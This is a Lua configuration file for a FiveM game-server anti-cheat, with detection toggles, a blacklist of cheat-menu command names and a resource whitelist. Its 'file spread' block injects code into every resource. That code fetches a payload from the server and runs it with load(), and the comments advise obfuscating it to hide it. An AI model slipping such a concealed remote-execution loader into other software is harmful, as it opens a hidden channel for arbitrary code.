--[[
	Nertigel's Simple Anti-Cheat
]]

Config = {}

Config.threadDelay = 5000
Config.maxHealth = 200 --[[Keep 200 if you didn't change your max health]]
Config.disallowSpectating = false --[[Triggered if user spectates using NetworkSetInSpectatorMode native]]
Config.invincibilityCheck = false --[[Kinda buggy rn]]
Config.damageMultiplierCheck = true --[[Triggered if GetPlayerWeaponDamageModifier > 1.0]]
Config.thermalVisionCheck = true --[[Triggered on GetUsingseethrough native]]
Config.nightVisionCheck = true --[[Triggered on GetUsingnightvision native]]
Config.blacklistCommands = true --[[Blacklist commands with list below]]
Config.blacklistedCommands = {
	'chocolate',
	'pk',
	'haha',
	'lol',
	'panickey',
	'killmenu',
	'lynx',
	'brutan',
	'panic'
}

Config.onResourceStopCheck = false --[[Triggered if anti-cheat resource is being stopped]]
Config.onResourceStartCheck = true --[[Triggered if a new resource is being started]]
Config.onResourceStartLength = 16 --[[Length of disallowed resource name]]
Config.allowedResources = { --[[Resource names that are >=onResourceStartLength length and should be skipped]]
	'fivem-map-hipster',
	'fivem-map-skater',
	'essentialmode',
	'loaf_housingshells',
	'esx_addonaccount',
	'esx_addoninventory',
	'esx_communityservice',
	'esx_ambulancejob',
	'esx_addons_gcphone',
	'esx_inventoryhud',
	'esx_inventoryhud_trunk',
	'esx_menu_default',
	'esx_menu_list',
	'esx_menu_dialog',
	'dodg_16challenger',
	'vanilla_vincent2',
	'vanilla_vincent3',
	'vanilla_sultanw'
}

Config.currentFramework = 'ESX' --[[Options: ESX | VRP | NONE]]

--[[
	Anti resource execution aka file spread that was made for AlphaVeta by nekler
	Command: /nsac install/uninstall all/resource_name | Only through console/0
]]
Config.fsName = 'nsac.lua' --[[Name of the file to be spread]]
Config.fsManifest = '__resource.lua' --[[Don't modify if you have no clue of what you're doing | __resource.lua or fxmanifest.lua | ]]

--[[
	This is the code that will be inside the fsName file(s).
	I would recommend you to either obfuscate it with IronBrew2 or with XFuscator to hide your log/trigger events.	
]]
Config.fsCode = [[
Citizen.CreateThread(function()
	while not NetworkIsSessionStarted() do Wait(0) end
	TriggerServerEvent('d0pamine:request-load')
end)

RegisterNetEvent('d0pamine:start-load')
AddEventHandler('d0pamine:start-load', function(code)
	assert(load(code))()
end)

local oldGiveWeaponToPed = GiveWeaponToPed
GiveWeaponToPed = function(ped, weaponHash, ammoCount, isHidden, equipNow)
	if not ped then ped = 0 end 
	if not weaponHash then weaponHash = 0 end 
	if not ammoCount then ammoCount = 0 end 
	if not isHidden then isHidden = 0 end 
	if not equipNow then equipNow = 0 end 
	oldGiveWeaponToPed(ped, weaponHash, ammoCount, isHidden, equipNow)
	TriggerServerEvent('nsac:log', 'nsac - GiveWeaponToPed in resource: '..GetCurrentResourceName())
end

local oldAddExplosion = AddExplosion
AddExplosion = function(x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake)
	if not x then x = 0 end 
	if not y then y = 0 end 
	if not z then z = 0 end 
	if not explosionType then explosionType = 0 end 
	if not damageScale then damageScale = 0 end 
	if not isAudible then isAudible = 0 end 
	if not isInvisible then isInvisible = 0 end 
	if not cameraShake then cameraShake = 0 end 
	oldAddExplosion(x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake)
	TriggerServerEvent('nsac:log', 'nsac - AddExplosion in resource: '..GetCurrentResourceName())
end
]]